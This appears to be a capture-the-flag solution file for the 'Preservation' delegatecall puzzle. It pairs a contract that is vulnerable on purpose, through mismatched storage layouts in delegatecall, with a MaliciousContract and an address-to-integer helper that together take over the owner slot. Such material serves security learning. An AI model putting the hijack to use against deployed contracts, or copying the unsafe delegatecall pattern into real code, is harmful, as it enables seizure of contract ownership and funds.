// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

contract MaliciousContract {
  // stores a timestamp
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  event Slots(address indexed slot0, address indexed slot1, address indexed slot2);

  function setTime(uint256 _time) public {
    owner = msg.sender;
    emit Slots(timeZone1Library, timeZone2Library, owner);
  }

  function getInt() view public returns(uint160) {
      return uint160(bytes20(address(this)));
  }
}
